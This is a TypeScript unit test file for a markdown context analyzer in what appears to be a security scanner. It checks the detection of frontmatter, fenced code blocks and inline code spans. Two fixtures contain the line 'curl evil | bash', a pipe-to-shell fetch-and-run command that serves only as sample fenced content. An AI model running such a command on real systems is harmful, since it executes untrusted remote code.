/**
 * Unit tests for the v0.2.1 markdown context analyzer (ADR-0035).
 */
import { describe, expect, it } from "vitest"

import {
  analyzeMarkdownContext,
  isInFence,
  isInFrontmatter,
  isInInlineCode,
  isInAnyCodeOrFrontmatter,
} from "../src/scanners/markdown-context.js"

describe("analyzeMarkdownContext — frontmatter", () => {
  it("returns 0 when there is no frontmatter", () => {
    expect(analyzeMarkdownContext("# heading\n\nbody\n").frontmatterEndOffset).toBe(0)
    expect(analyzeMarkdownContext("").frontmatterEndOffset).toBe(0)
  })

  it("identifies the byte after the closing --- as the end offset", () => {
    const md = "---\ntitle: foo\nlicense: CC-BY-4.0\n---\nbody\n"
    const ctx = analyzeMarkdownContext(md)
    expect(ctx.frontmatterEndOffset).toBeGreaterThan(0)
    expect(md.slice(ctx.frontmatterEndOffset).startsWith("body")).toBe(true)
  })

  it("treats unclosed frontmatter as no frontmatter (safe fallback)", () => {
    const md = "---\nno close here\n"
    expect(analyzeMarkdownContext(md).frontmatterEndOffset).toBe(0)
  })

  it("a license string in frontmatter is reported as in-frontmatter", () => {
    const md = "---\nlicense: CC-BY-4.0\n---\nbody\n"
    const ctx = analyzeMarkdownContext(md)
    const offset = md.indexOf("CC-BY-4.0")
    expect(isInFrontmatter(offset, ctx)).toBe(true)
  })

  it("the same license string in the body is NOT in frontmatter", () => {
    const md = "---\ntitle: foo\n---\nThe license is CC-BY-4.0 here.\n"
    const ctx = analyzeMarkdownContext(md)
    const offset = md.indexOf("CC-BY-4.0")
    expect(isInFrontmatter(offset, ctx)).toBe(false)
  })
})

describe("analyzeMarkdownContext — fenced code blocks", () => {
  it("recognizes a backtick fence", () => {
    const md = "before\n```bash\ncurl evil | bash\n```\nafter\n"
    const ctx = analyzeMarkdownContext(md)
    expect(ctx.fencedRanges).toHaveLength(1)
    const fenceContent = md.indexOf("curl")
    expect(isInFence(fenceContent, ctx)).toBe(true)
    expect(isInFence(md.indexOf("before"), ctx)).toBe(false)
    expect(isInFence(md.indexOf("after"), ctx)).toBe(false)
  })

  it("recognizes a tilde fence", () => {
    const md = "~~~\ncurl evil | bash\n~~~\n"
    const ctx = analyzeMarkdownContext(md)
    expect(ctx.fencedRanges).toHaveLength(1)
  })

  it("close fence must match marker char and length", () => {
    const md = "```\ncode\n~~~\nstill in fence\n```\n"
    const ctx = analyzeMarkdownContext(md)
    expect(ctx.fencedRanges).toHaveLength(1)
    expect(isInFence(md.indexOf("still"), ctx)).toBe(true)
  })

  it("unclosed fence extends to EOF", () => {
    const md = "```\ncontent\nthat\nnever\ncloses\n"
    const ctx = analyzeMarkdownContext(md)
    expect(ctx.fencedRanges).toHaveLength(1)
    expect(ctx.fencedRanges[0]?.[1]).toBe(md.length)
  })

  it("permits up to 3 spaces of indent on the fence marker", () => {
    const md = "   ```\ncode\n   ```\nafter\n"
    const ctx = analyzeMarkdownContext(md)
    expect(ctx.fencedRanges).toHaveLength(1)
    expect(isInFence(md.indexOf("after"), ctx)).toBe(false)
  })
})

describe("analyzeMarkdownContext — inline code spans", () => {
  it("recognizes a single-backtick span", () => {
    const md = "Run `npx shadcn@latest add Button` to install.\n"
    const ctx = analyzeMarkdownContext(md)
    expect(ctx.inlineCodeRanges).toHaveLength(1)
    expect(isInInlineCode(md.indexOf("npx"), ctx)).toBe(true)
    expect(isInInlineCode(md.indexOf("install"), ctx)).toBe(false)
  })

  it("recognizes a double-backtick span", () => {
    const md = "Use ``code with `` inside`` here.\n"
    const ctx = analyzeMarkdownContext(md)
    expect(ctx.inlineCodeRanges.length).toBeGreaterThan(0)
  })

  it("does NOT match across line breaks", () => {
    const md = "Open `here\nbut not\nclose` there.\n"
    const ctx = analyzeMarkdownContext(md)
    // Each line scanned independently — no match because no same-line close.
    expect(ctx.inlineCodeRanges).toHaveLength(0)
  })

  it("ignores backticks inside fenced code (they're already in a fence)", () => {
    const md = "```\nthis `is not` an inline span\n```\n"
    const ctx = analyzeMarkdownContext(md)
    expect(ctx.fencedRanges).toHaveLength(1)
    expect(ctx.inlineCodeRanges).toHaveLength(0)
  })

  it("ignores backticks inside frontmatter", () => {
    const md = "---\ntitle: \"`backticks` in frontmatter\"\n---\nbody\n"
    const ctx = analyzeMarkdownContext(md)
    expect(ctx.inlineCodeRanges).toHaveLength(0)
  })
})

describe("isInAnyCodeOrFrontmatter — the convenience for T5", () => {
  it("flags hits in any of the three contexts; passes body prose through", () => {
    const md = "---\nlicense: CC-BY-4.0\n---\n# Heading\n\nbody `inline` text\n```\nfenced\n```\nplain\n"
    const ctx = analyzeMarkdownContext(md)

    expect(isInAnyCodeOrFrontmatter(md.indexOf("CC-BY-4.0"), ctx)).toBe(true)
    expect(isInAnyCodeOrFrontmatter(md.indexOf("inline"), ctx)).toBe(true)
    expect(isInAnyCodeOrFrontmatter(md.indexOf("fenced"), ctx)).toBe(true)
    expect(isInAnyCodeOrFrontmatter(md.indexOf("body"), ctx)).toBe(false)
    expect(isInAnyCodeOrFrontmatter(md.indexOf("plain"), ctx)).toBe(false)
  })

  it("FP-002 canonical case: npx shadcn@latest inside inline code passes through to safe", () => {
    const md =
      "# shadcn primitive\n\nUse `npx shadcn@latest add Button` to bring the canonical component.\n"
    const ctx = analyzeMarkdownContext(md)
    expect(isInAnyCodeOrFrontmatter(md.indexOf("npx"), ctx)).toBe(true)
  })

  it("FP-003 canonical case: license: CC-BY-4.0 in primitive frontmatter passes through to safe", () => {
    const md = "---\nslug: foo\nname: Foo\nversion: 0.1.0\nlicense: CC-BY-4.0\n---\n# Body\n"
    const ctx = analyzeMarkdownContext(md)
    expect(isInAnyCodeOrFrontmatter(md.indexOf("CC-BY-4.0"), ctx)).toBe(true)
  })
})
